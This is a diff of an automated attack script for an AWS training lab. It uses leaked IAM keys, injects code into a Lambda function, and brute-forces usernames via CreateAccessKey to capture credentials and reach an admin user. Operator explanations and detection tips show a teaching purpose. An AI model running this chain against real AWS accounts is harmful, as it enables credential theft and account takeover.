@@ -42,94 +42,6 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
-banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 5               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Configuring aws credentials\n"
-  printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. Inspect IAM user policies for owned user\n"
-  printf "  • Step 4. Enumerating Lambda functions\n"
-  printf "  • Step 5. Modify Lambda to enumerate under its role\n"
-  printf "  • Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)\n"
-  printf "  • Step 7. CreateAccessKey guessing via Lambda\n"
-  printf "  • Step 8. Validate captured keys; detect admin\n"
-  printf "  • Step 9. Cleanup\n"
-  
-}
-banner
-
-#############################################
-# Preflight checks (no changes to your logic)
-#############################################
-step "Preflight checks"
-missing=0
-for c in aws curl jq zip; do
-  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
-done
-[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
-
-read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
-#############################################
-# Step 1. Configuring aws credentials
-#############################################
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
-is_valid_keys() {
-  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
-  local rc=0 out
-
-  # 1) Ensure no env creds override our profile
-  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
-  PROFILE="streamgoat-scenario-5"
-  
-  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
-  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
-  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
-  aws configure set region                "$region" --profile "$PROFILE"
-
-  # 3) Force the call to use our profile
-  spin_start "Validating credentials via STS"
-  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
-  spin_stop
-
-
-  if [ "$rc" -ne 0 ]; then
-    return 1
-  fi
-
-  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
-
-  return 0
-}
-
-step "Starting point configuration"
-while :; do
-  read -r -p "Enter leaked AWS key: " AWSKEY_USER
-  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
-  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
-    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
-    break
-  else
-    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
-  fi
-done
-printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
-#############################################
-# Operator explanation
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
-printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
-printf "This scenario demonstrates an attack through Lambda functions\n"
-printf "when the user cannot list IAM users but can manipulate Lambda.\n\n"
-
-#############################################
-# Step 2. Permission enumeration for leaked credentials
-#############################################
-printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
-
-# init colors (portable)
-
 try() {
   local desc="$1"; shift
   local rc
@@ -143,6 +55,94 @@ try() {
     printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
   fi
 }
+
+is_valid_keys() {
+  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
+  local rc=0 out
+
+  # 1) Ensure no env creds override our profile
+  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
+  PROFILE="streamgoat-scenario-5"
+
+  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
+  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
+  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
+  aws configure set region                "$region" --profile "$PROFILE"
+
+  # 3) Force the call to use our profile
+  spin_start "Validating credentials via STS"
+  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
+  spin_stop
+
+  if [ "$rc" -ne 0 ]; then
+    return 1
+  fi
+
+  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
+
+  return 0
+}
+
+banner() {
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 5               ===" "${RESET}"
+  printf "%sLeaked Keys → Lambda Code Injection → IAM CreateAccessKey Brute-force%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Configuring aws credentials\n"
+  printf "  • Step 2. Permission enumeration for leaked credentials\n"
+  printf "  • Step 3. Inspect IAM user policies for owned user\n"
+  printf "  • Step 4. Enumerating Lambda functions\n"
+  printf "  • Step 5. Modify Lambda to enumerate under its role\n"
+  printf "  • Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)\n"
+  printf "  • Step 7. CreateAccessKey guessing via Lambda\n"
+  printf "  • Step 8. Validate captured keys; detect admin\n"
+  printf "  • Step 9. Cleanup\n"
+
+}
+banner
+
+#############################################
+# Preflight checks
+#############################################
+step "Preflight checks"
+missing=0
+for c in aws jq zip; do
+  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
+done
+[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
+
+read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
+#############################################
+# Step 1. Configuring aws credentials
+#############################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
+
+step "Starting point configuration"
+while :; do
+  read -r -p "Enter leaked AWS key: " AWSKEY_USER
+  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
+  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
+    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
+    break
+  else
+    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
+  fi
+done
+
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
+printf "This scenario demonstrates an attack through Lambda functions\n"
+printf "when the user cannot list IAM users but can manipulate Lambda.\n\n"
+
+printf "\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+#############################################
+# Step 2. Permission enumeration for leaked credentials
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
 
 # Identity/context
 try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
@@ -162,10 +162,6 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, we can list Lambda which looks interesting but let's try to get some more info about our user...\n"
-printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -175,6 +171,9 @@ printf "  • ${MAGENTA}Lambda ListFunctions${RESET}: Succeeded\n"
 printf "  • Most IAM operations: Denied (can't list users)\n\n"
 printf "Lambda access is valuable because Lambda functions often have\n"
 printf "more privileged IAM roles than users.\n\n"
+
+printf "\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 3. Inspect IAM user policies for neo
@@ -206,10 +205,6 @@ if [ -n "$INLINE_POLICY_NAMES" ]; then
   done
 fi
 
-printf "\nIt shows that we may perform any operations against Lambdas. Lets see on next step what lambdas do we have...\n"
-printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -220,6 +215,9 @@ printf "  • InvokeFunction: Execute Lambda functions\n"
 printf "  • GetFunction: Download Lambda source code\n\n"
 printf "Lambda functions execute with their own IAM roles, which may\n"
 printf "have different (more) permissions than our user.\n\n"
+
+printf "\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 4. Lambda enumeration + source code
@@ -235,10 +233,10 @@ if [ -z "$LAMBDA_LIST" ]; then
 fi
 
 # Look for functions matching the lab pattern
-TARGET_FUNCTIONS=$(echo "$LAMBDA_LIST" | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-')
+TARGET_FUNCTIONS=$(echo "$LAMBDA_LIST" | tr '\t' '\n' | grep -E '^StreamGoat-aws5-Lambda-')
 
 if [ -z "$TARGET_FUNCTIONS" ]; then
-  err "No matching StreamGoat-Lambda-* functions found"
+  err "No matching StreamGoat-aws5-Lambda-* functions found"
   exit 1
 fi
 
@@ -284,9 +282,6 @@ done
 
 rm -rf /tmp/streamgoat-scenario5-lambdadump
 cd - > /dev/null
-printf "\n\nWith ${YELLOW}lambda:*${RESET} we may modify configuration of the lambda. Lets upload the new code which will enumerate Lambda's privileges the same way we did on step 2.\n"
-printf "\n"
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -296,20 +291,23 @@ printf "We extracted Lambda source code using GetFunction.\n\n"
 printf "The code reveals it performs IAM operations like creating\n"
 printf "users and groups, hinting at IAM-related permissions.\n\n"
 
+printf "\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
 #############################################
 # Step 5. Modify Lambda to enumerate under its role
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 5. Modifying Lambda to run baseline enumeration  ===" "${RESET}"
 
-# Choose target Lambda (first StreamGoat-Lambda-*). You can override via env FUNC.
+# Choose target Lambda (first StreamGoat-aws5-Lambda-*). You can override via env FUNC.
 if [ -z "${FUNC:-}" ]; then
   FUNC=$(aws lambda list-functions --profile "$PROFILE" \
           --query 'Functions[*].FunctionName' --output text 2>/dev/null \
-        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
+        | tr '\t' '\n' | grep -E '^StreamGoat-aws5-Lambda-' | head -n 1)
 fi
 
 if [ -z "$FUNC" ]; then
-  err "No StreamGoat-Lambda-* found to modify."
+  err "No StreamGoat-aws5-Lambda-* found to modify."
   exit 1
 fi
 ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"
@@ -458,9 +456,6 @@ fi
 cd /tmp
 rm -rf "$WORKDIR"
 cd - > /dev/null
-printf "\nIt seems Lambda doesn't have any specific permission set on it. However if we get back the original content of the Lambda, we may notice it was set to create User and Group. What if the Lambda has iam:Create* permissions set? Lets verify.\n"
-printf "\n"
-read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -468,20 +463,25 @@ read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We injected enumeration code into the Lambda.\n\n"
 printf "When invoked, it runs API calls with the Lambda's IAM role.\n"
-printf "The original code suggested ${MAGENTA}iam:Create*${RESET} capabilities.\n\n"
+printf "The original code suggested to check for ${MAGENTA}iam:Create*${RESET} capabilities.\n\n"
+printf "If iam:Create* includes ${MAGENTA}iam:CreateAccessKey${RESET}, we can generate\n"
+printf "credentials for any user — but we need to know the username first.\n\n"
+
+printf "\n"
+read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)
 #############################################
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Validating assumption of having iam:Create*  ===" "${RESET}"
 
-# Pick target Lambda (first StreamGoat-Lambda-*) unless FUNC is preset
+# Pick target Lambda (first StreamGoat-aws5-Lambda-*) unless FUNC is preset
 if [ -z "${FUNC:-}" ]; then
   FUNC=$(aws lambda list-functions --profile "$PROFILE" \
           --query 'Functions[*].FunctionName' --output text 2>/dev/null \
-        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
+        | tr '\t' '\n' | grep -E '^StreamGoat-aws5-Lambda-' | head -n 1)
 fi
-[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
+[ -z "$FUNC" ] && { err "No StreamGoat-aws5-Lambda-* found."; exit 1; }
 ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"
 
 cd /tmp
@@ -636,10 +636,6 @@ cd /tmp
 rm -rf "$WORKDIR"
 cd - > /dev/null
 
-printf "\nWe see some good result we may use. We see that not only User creation and group Creaton is allowed for Lambda, but Roles and Policies as well. It can make us thinking we have wildcard permissions set ${YELLOW}iam:Create*${RESET}. But unfortunately user we own doesn't have permissions to list existing users. Lambda doesn't have this permissions either. So what we can do? We can try performing operation of CreateAccessKey on guessed users based on format we know (StreamGoat-User-). If operation successful - we will receive new keys to pivot further.\n"
-printf "\n"
-read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -648,6 +644,9 @@ printf "Lambda's role has ${MAGENTA}iam:Create*${RESET} permissions:\n"
 printf "  • CreateUser, CreateGroup, CreatePolicy, CreateRole\n\n"
 printf "If we have iam:Create*, we likely have ${MAGENTA}iam:CreateAccessKey${RESET}!\n"
 printf "This lets us create credentials for ANY user - even without ListUsers.\n\n"
+
+printf "\n"
+read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 7. CreateAccessKey guessing via Lambda
@@ -658,18 +657,21 @@ printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 7. Attempting iam:CreateAccess
 if [ -z "${FUNC:-}" ]; then
   FUNC=$(aws lambda list-functions --profile "$PROFILE" \
           --query 'Functions[*].FunctionName' --output text 2>/dev/null \
-        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
+        | tr '\t' '\n' | grep -E '^StreamGoat-aws5-Lambda-' | head -n 1)
 fi
-[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
+[ -z "$FUNC" ] && { err "No StreamGoat-aws5-Lambda-* found."; exit 1; }
 ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"
+
+# Extract the suffix from the Lambda function name for user brute-force
+LAMBDA_SUFFIX=$(echo "$FUNC" | sed 's/^StreamGoat-aws5-Lambda-mgmt-//')
 
 cd /tmp
 WORKDIR="$(mktemp -d -t sg-lambda-keys-XXXXXX)"
 ZIPFILE="${WORKDIR}/payload.zip"
 PYFILE="${WORKDIR}/index.py"
 
-# Lambda code: try CreateAccessKey on 20 candidates
-cat > "$PYFILE" <<'PYCODE'
+# Lambda code: try CreateAccessKey on candidates with dynamic suffix
+cat > "$PYFILE" <<PYCODE
 import json
 import boto3
 from botocore.exceptions import ClientError
@@ -685,7 +687,7 @@ def handler(event, context):
     ]
     results = []
     for name in candidates:
-        username = f"StreamGoat-User-{name}"
+        username = f"StreamGoat-aws5-User-{name}-${LAMBDA_SUFFIX}"
         entry = {"user": username, "ok": False}
         try:
             resp = iam.create_access_key(UserName=username)
@@ -768,10 +770,6 @@ cd /tmp
 rm -rf "$WORKDIR"
 cd - > /dev/null
 
-printf "\nTrying to guess username via creating of AccessKeys we were able to identify 3 users! Now lets use them to auth and check their permissions.\n"
-printf "\n"
-read -r -p "Step 7 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -780,6 +778,9 @@ printf "We brute-forced usernames via CreateAccessKey:\n"
 printf "  • NoSuchEntity → User doesn't exist\n"
 printf "  • Success → User exists AND we have their new credentials!\n\n"
 printf "Multiple users discovered with their access keys captured.\n\n"
+
+printf "\n"
+read -r -p "Step 7 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 8. Validate captured keys and check for admin
@@ -874,10 +875,6 @@ else
   info "No admin users detected among captured keys."
 fi
 
-printf "\nAnd we have a user with full admin privileges! Congratulations!\n"
-printf "\n"
-read -r -p "Step 8 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-
 #############################################
 # Operator explanation
 #############################################
@@ -885,6 +882,9 @@ printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
 printf "We validated captured credentials and found an admin user!\n\n"
 printf "One user has ${MAGENTA}AdministratorAccess${RESET} policy attached.\n"
 printf "We now have full account admin privileges.\n\n"
+
+printf "\n"
+read -r -p "Step 8 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Step 9. Cleanup created access keys (admin-assisted)
@@ -1012,4 +1012,3 @@ printf "  • CreateAccessKey events (especially multiple in sequence)\n"
 printf "  • Lambda code updates (UpdateFunctionCode)\n"
 printf "  • Unusual Lambda invocations\n"
 printf "  • Access key usage from unexpected locations\n\n"
-
